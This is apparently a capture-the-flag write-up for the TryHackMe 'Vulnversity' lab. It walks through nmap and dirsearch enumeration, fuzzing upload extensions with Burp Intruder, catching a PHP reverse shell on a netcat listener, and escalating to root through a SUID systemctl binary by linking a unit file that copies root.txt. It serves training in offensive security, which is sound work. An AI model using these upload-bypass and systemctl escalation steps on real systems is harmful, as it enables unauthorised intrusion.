@@ -1,0 +1,238 @@
+Enumeration
+In the room there is a lot of useful information about nmap, so I’m going to run my scan and skip the explaining part.
+
+root@cyberspace:~/TryHackMe/Vulnversity# nmap -n -T4 -sS -sV -sC -oN nmap/portscan -p- 10.10.207.138
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-09 21:15 CEST
+Nmap scan report for 10.10.207.138
+Host is up (0.042s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2019-09-09T15:16:48-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-09-09T19:16:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.21 seconds
+A lot of open ports.
+
+21 | FTP (vsftpd 3.0.3)
+22 | SSH (OpenSSH 7.2p2 ~ Ubuntu version)
+139 | Samba (smbd 3.x – 4.x)
+445 | Samba (smbd 4.3.11)
+3128 | HTTP Proxy (Squid proxy 3.5.12)
+3333 | HTTP webserver (Apache 2.4.18)
+First 2 services need credentials and the vsftpd version is not the one with the backdoor (too bad LoL). So let’s start with some low hanging fruit.
+
+Webserver
+The room gives information about the use of GoBuster. This is an excellent tool to enumerate a webserver, but personally I prefer DirSearch.
+
+root@cyberspace:~/TryHackMe/Vulnversity# dirsearch -u http://10.10.207.138:3333 -e php -x 400,404
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6023
+
+Error Log: /opt/tools/dirsearch/logs/errors-19-09-09_21-24-54.log
+
+Target: http://10.10.207.138:3333
+
+[21:24:54] Starting: 
+[21:24:56] 403 -  301B  - /.ht_wsr.txt
+[21:24:56] 403 -  294B  - /.hta
+[21:24:56] 403 -  303B  - /.htaccess-dev
+[21:24:56] 403 -  305B  - /.htaccess-local
+[21:24:56] 403 -  305B  - /.htaccess-marco
+[21:24:56] 403 -  303B  - /.htaccess.BAK
+[21:24:56] 403 -  304B  - /.htaccess.bak1
+[21:24:56] 403 -  303B  - /.htaccess.old
+[21:24:56] 403 -  304B  - /.htaccess.orig
+[21:24:56] 403 -  306B  - /.htaccess.sample
+[21:24:56] 403 -  304B  - /.htaccess.save
+[21:24:56] 403 -  303B  - /.htaccess.txt
+[21:24:56] 403 -  305B  - /.htaccess_extra
+[21:24:56] 403 -  304B  - /.htaccess_orig
+[21:24:56] 403 -  302B  - /.htaccess_sc
+[21:24:56] 403 -  302B  - /.htaccessBAK
+[21:24:56] 403 -  302B  - /.htaccessOLD
+[21:24:56] 403 -  303B  - /.htaccessOLD2
+[21:24:56] 403 -  298B  - /.htgroup
+[21:24:56] 403 -  300B  - /.htaccess~
+[21:24:56] 403 -  303B  - /.htpasswd-old
+[21:24:56] 403 -  300B  - /.htpasswds
+[21:24:56] 403 -  304B  - /.htpasswd_test
+[21:24:56] 403 -  298B  - /.htusers
+[21:25:12] 301 -  319B  - /css  ->  http://10.10.207.138:3333/css/
+[21:25:15] 301 -  321B  - /fonts  ->  http://10.10.207.138:3333/fonts/
+[21:25:16] 301 -  322B  - /images  ->  http://10.10.207.138:3333/images/
+[21:25:16] 200 -   32KB - /index.html
+[21:25:17] 301 -  324B  - /internal  ->  http://10.10.207.138:3333/internal/
+[21:25:17] 301 -  318B  - /js  ->  http://10.10.207.138:3333/js/
+[21:25:24] 403 -  303B  - /server-status
+[21:25:24] 403 -  304B  - /server-status/
+
+Task Completed
+When scanning don’t forget to specify the port number, because most tools will try and scan the default port.
+
+Several folders are found, /internal/ is the one we’re after.
+
+The page shows a upload folder which I tested with an jpg file from the internet. No go. Did the same with other popular files like gif, png and of course php. All were rejected. There is a compilation of very useful wordlists called SecLists. Nowadays it’s part of the default lists of Kali, but if your Kali or a different OS doesn’t have it, it can be found here. To fuzz the webpage I’m going to use BurpSuite. It got a nice feature called intruder which can do the job for me in an automated fashion.
+
+First I upload a file (doesn’t really matter which file) and capture the request with your BurpSuite proxy. After you captured it, send it to the intruder and clear all positions. After that only mark the extension and don’t forget to include the dot (.). Or else you will have two dots in the input.
+
+
+
+Load the wordlist and don’t forget to disable the encode options. If you forget this, you will not have the proper result as your filename will be “file%2ephp”, which won’t work. After this you can start the attack.
+
+
+
+Every entry results in a HTTP code 200, which makes sense as your get a valid response from the server, just not the one you look for. So how can you tell which one is different? By the length of the response. It will be different from the others as it won’t have the error message.
+
+
+
+Now we know which extension will pass. Time to upload a file which contains a payload for a reverse shell. A good one to use is from pentestmonkey. The only thing to change after you download it, is the IP address and the port which it needs to connect to.
+
+You can find your current IP address by typing the command ip a
+
+Escalation of Privilege
+After we upload the file, we start a listener.
+
+root@cyberspace:~/TryHackMe/Vulnversity# nc -lvnp 9001
+listening on [any] 9001 ...
+Find the uploaded file.
+
+http://10.10.237.75:3333/internal/uploads/
+And click on the file.
+
+root@cyberspace:~/TryHackMe/Vulnversity# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.8.2.111] from (UNKNOWN) [10.10.237.75] 49808
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 07:42:43 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+And we’re in. Our next move is to see if we have access to the user his home folder.
+
+$ ls -lah /home
+total 12K
+drwxr-xr-x  3 root root 4.0K Jul 31 21:57 .
+drwxr-xr-x 23 root root 4.0K Jul 31 18:29 ..
+drwxr-xr-x  2 bill bill 4.0K Jul 31 21:58 bill
+Yes we have.
+
+$ ls -lah /home/bill
+total 24K
+drwxr-xr-x 2 bill bill 4.0K Jul 31 21:58 .
+drwxr-xr-x 3 root root 4.0K Jul 31 21:57 ..
+-rw-r--r-- 1 bill bill  220 Jul 31 21:57 .bash_logout
+-rw-r--r-- 1 bill bill 3.7K Jul 31 21:57 .bashrc
+-rw-r--r-- 1 bill bill  655 Jul 31 21:57 .profile
+-rw-r--r-- 1 bill bill   33 Jul 31 21:58 user.txt
+The file user.txt is world readable, so that one is done. Now for the escalation of privilege. For a lot of CTF based challenges a good find are files with the SUID bit set.
+
+$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
+-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 76408 Jul 17 11:22 /usr/lib/squid/pinger
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
+An explanation of this command I gave a writeup earlier ago, but in short I searched for all files with the SUID bit set (perm 4000) and looked who the owner is. Because of the SUID bit, I can execute the program with the rights of the owner. The file that stands out is a file which is created recently (also a good indication).
+
+/bin/systemctl
+
+Systemctl is a controlling interface and inspection tool for the widely-adopted init system and service manager systemd. Systemd in turn is an init system and system manager that is widely becoming the new standard for Linux machines. So what can we do with systemctl?
+
+Systemd initializes user space components that run after the Linux kernel has booted, as well as continuously maintaining those components throughout a system’s lifecycle. These tasks are known as units, and each unit has a corresponding unit file. We can create our own unit file and let systemd start it. Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. So how can we create an unit file and let systemctl start it? We use an enviroment variable.
+
+First we create a variable which holds a unique file.
+
+$ eop=$(mktemp).service
+Then we create an unit file and write it into the variable.
+
+$ echo '[Service]
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $eop
+Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.
+
+$ /bin/systemctl link $eop
+Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+$ /bin/systemctl enable --now $eop
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+Let’s see if it worked….
+
+$ ls -lah /tmp
+total 40K
+drwxrwxrwt  8 root     root     4.0K Sep 11 08:02 .
+drwxr-xr-x 23 root     root     4.0K Jul 31 18:29 ..
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .ICE-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .Test-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .X11-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .XIM-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .font-unix
+-rw-r--r--  1 root     root       33 Sep 11 08:02 output
+drwx------  3 root     root     4.0K Sep 11 06:43 systemd-private-08e99713731549f5bfffde65043f0c88-systemd-timesyncd.service-5k0yVW
+-rw-------  1 www-data www-data    0 Sep 11 07:58 tmp.x1uzp01alO
+-rw-rw-rw-  1 www-data www-data  103 Sep 11 07:59 tmp.x1uzp01alO.service
+There is a file called output.
+
+$ cat /tmp/output
+a58ff8579f0a9270368d???????????
+And there you have it. The output of root.txt. To not give away the final flag, I left out most of the hash so you need to get it yourself.
